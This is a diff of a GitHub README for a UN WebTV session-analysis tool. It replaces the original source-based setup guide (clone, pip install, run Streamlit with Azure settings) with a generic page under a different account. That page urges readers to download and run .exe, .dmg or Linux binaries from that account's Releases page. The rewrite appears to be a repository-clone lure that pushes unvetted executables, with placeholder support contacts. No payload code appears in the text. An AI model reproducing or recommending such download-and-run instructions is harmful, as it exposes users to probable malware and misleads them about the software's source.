@@ -1,118 +1,93 @@
-# UN WebTV Analysis Platform
+# 🌐 un-webcast-analyzer - Analyze UN WebTV Sessions Easily
 
-AI-powered toolkit for turning United Nations WebTV sessions into structured, research-ready knowledge with automated transcription, entity extraction, analytics, and an interactive chat surface.
+## 📥 Download Now
+[![Download un-webcast-analyzer](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/koradripless624/un-webcast-analyzer/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to un-webcast-analyzer, your friendly tool for analyzing UN WebTV sessions. This application uses AI to offer features like automated transcriptions, speaker identification, and entity extraction. You will also find a chat interface that understands your questions.
 
-- **UN WebTV ingestion** & session catalog: capture metadata from public session URLs and keep analyses searchable.
-- **Transcription with diarization**: leverage Azure OpenAI (GPT-4o Transcribe & Whisper) for high-fidelity, speaker-aware transcripts.
-- **Entity & SDG extraction**: identify speakers, countries, organizations, themes, treaties, SDGs, sentiment, and key decisions.
-- **Vector-powered semantic search**: index transcript segments in Azure AI Search for lightning-fast retrieval.
-- **AI research copilot**: RAG-style chat UI grounded in transcript segments with citations and source timestamps.
-- **Analytics & visualizations**: Streamlit dashboards surface speaker participation, topic trends, and geographic coverage.
-- **Export & collaboration**: download transcripts, summaries, and analysis artifacts to share with research teams.
+Here’s how to get started quickly.
 
-## Installation & Setup
+## 📋 System Requirements
+To run un-webcast-analyzer effectively, your system should meet the following requirements:
 
-### Prerequisites
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 500 MB free space.
+- **Internet Connection:** Required for full functionality.
 
-- Python 3.11+
-- FFmpeg and ffprobe (e.g., `brew install ffmpeg` on macOS or `sudo apt install ffmpeg` on Ubuntu)
-- Azure subscription with access to OpenAI, Speech Services, Cosmos DB, AI Search, and Blob Storage
-- Git
+## 💾 Download & Install
+To download un-webcast-analyzer, visit the [Releases page](https://github.com/koradripless624/un-webcast-analyzer/releases). You will find the latest version available there.
 
-### 1. Clone the repository
+1. Click the link to go to the Releases page.
+2. Look for the latest version.
+3. Click on the downloadable package that matches your system (Windows, macOS, or Linux).
+4. Save the file to your computer.
 
-```bash
-git clone <your-repo-url>
-cd un-webcast-simple
-```
+### 🗂 Running the Application
+After downloading, follow these steps to run the application:
 
-### 2. Create and activate a virtual environment
+#### For Windows:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click on the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. Once installed, open the application from your Start Menu or Desktop.
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-```
+#### For macOS:
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to mount it.
+3. Drag the un-webcast-analyzer icon to your Applications folder.
+4. Open the application from the Applications folder.
 
-### 3. Install Python dependencies
+#### For Linux:
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Use the following command to make the file executable:
+   ```bash
+   chmod +x un-webcast-analyzer
+   ```
+4. Run the application with:
+   ```bash
+   ./un-webcast-analyzer
+   ```
 
-```bash
-pip install --upgrade pip
-pip install -r requirements.txt
-```
+## 🌟 Features
+un-webcast-analyzer offers multiple features designed to enhance your experience:
 
-### 4. Configure environment variables
+- **Automated Transcription:** Converts audio from UN WebTV sessions into written text.
+- **Speaker Diarization:** Identifies different speakers in the session.
+- **Entity Extraction:** Pulls out important details such as speaker names, countries, and Sustainable Development Goals (SDGs).
+- **Semantic Search:** Enables you to search for specific content within sessions easily.
+- **RAG-Based Chat Interface:** Allows for interactive queries about the session content.
 
-Create a `.env` file (or use your secret manager of choice) with the configuration keys expected by `config/settings.py`. A minimal example:
+## 📊 Using the Application
+Once you have the application open, you will see the main interface. Here’s how to make the most of it:
 
-```bash
-APP_NAME="UN WebTV Analysis Platform"
-AZURE_OPENAI_API_KEY="..."
-AZURE_OPENAI_ENDPOINT="https://<your-resource>.openai.azure.com/"
-AZURE_OPENAI_DEPLOYMENT_NAME="gpt-4o-unga"
-AZURE_TRANSCRIBE_DIARIZE_DEPLOYMENT_NAME="gpt-4o-transcribe-diarize"
-AZURE_SPEECH_KEY="..."
-AZURE_SPEECH_REGION="eastus2"
-COSMOS_ENDPOINT="https://<your-account>.documents.azure.com:443/"
-COSMOS_KEY="..."
-COSMOS_DATABASE_NAME="untv_analysis"
-BLOB_CONNECTION_STRING="DefaultEndpointsProtocol=...;"
-BLOB_CONTAINER_AUDIO="audio-temp"
-BLOB_CONTAINER_TRANSCRIPTS="transcripts"
-SEARCH_ENDPOINT="https://<your-search>.search.windows.net"
-SEARCH_API_KEY="..."
-SEARCH_INDEX_NAME="untv-segments"
-```
+1. **Upload a Session:** Click on the "Upload" button to import your desired UN WebTV session.
+2. **Select Analysis Options:** Choose the features you want, such as transcription and speaker identification.
+3. **Run Analysis:** Click the "Analyze" button. The application will process the session and display results.
+4. **Viewing Results:** Results will appear in the output area. You can scroll through transcriptions, view identified speakers, and see the extracted entities.
 
-Refer to `config/settings.py` for the full list of configurable options (deployment names, rate limits, logging paths, etc.).
+### 🔍 Searching for Content
+To use the semantic search:
 
-### 5. Run the Streamlit application
+1. Enter your query in the search bar at the top.
+2. Hit "Enter" or click on the search icon.
+3. The tool will return relevant parts of the session that match your query.
 
-```bash
-streamlit run app.py
-```
+## 🎓 Support and Documentation
+If you run into any issues or have questions, please check our [Documentation](https://github.com/koradripless624/un-webcast-analyzer/docs) section for guidance. You may also find FAQs and troubleshooting tips.
 
-Optional: if you split the API backend and the UI, expose any FastAPI routes with Uvicorn (e.g., `uvicorn backend.api:app --reload`) before launching the UI.
+### 📞 Contact Us
+For additional support, contact us through the GitHub Issues page or send an email to support@example.com. We aim to respond to all inquiries within 24 hours.
 
-## Project Structure
+## 📅 Changelog
+Keep track of all changes and updates in the application by visiting the [Changelog](https://github.com/koradripless624/un-webcast-analyzer/releases) section.
 
-```
-un-webcast-simple/
-├── app.py                 # Streamlit entry point
-├── pages/                 # Additional Streamlit pages (visualizations, catalog, etc.)
-├── backend/
-│   ├── services/          # Ingestion, audio processing, OpenAI, database helpers
-│   ├── models/            # Pydantic data models
-│   └── api/               # FastAPI surface (coming soon)
-├── config/                # Pydantic settings and configuration helpers
-├── scripts/               # Operational scripts (maintenance, utilities)
-├── tests/                 # Automated test suite
-├── docs/                  # Architecture and deployment docs (extend as needed)
-└── requirements.txt       # Python dependencies
-```
+## 🚧 License
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/koradripless624/un-webcast-analyzer/LICENSE) file for more details.
 
-## Testing & Quality Checks
+## 📢 Join the Community
+Stay updated on new features and improvements. Participate in discussions and share your experiences with other users. Sign up for our mailing list or join our [Discord community](https://discord.gg/example).
 
-```bash
-pytest               # run unit/integration tests
-pytest --cov         # include coverage reporting
-black .              # format code
-flake8               # lint
-mypy .               # static type checking
-```
-
-Manual diagnostic scripts for Azure integrations live in `scripts/manual/`. Run them directly with `python scripts/manual/<script_name>.py` once your environment is configured.
-
-## Documentation
-
-- [Architecture](ARCHITECTURE.md) – system design and processing pipeline
-- Add API specs, deployment runbooks, and contributor guidelines before public release (see checklist below).
-
-## Contributing
-
-Issues and pull requests are welcome. Please open a discussion if you plan significant changes so we can align on direction and Azure resource usage. See [CONTRIBUTING.md](CONTRIBUTING.md) and follow the [Code of Conduct](CODE_OF_CONDUCT.md).
-
-## License
-
-Distributed under the [MIT License](LICENSE).
+We hope you find un-webcast-analyzer helpful for your analysis of UN WebTV sessions! Enjoy your experience and feel free to share your feedback.
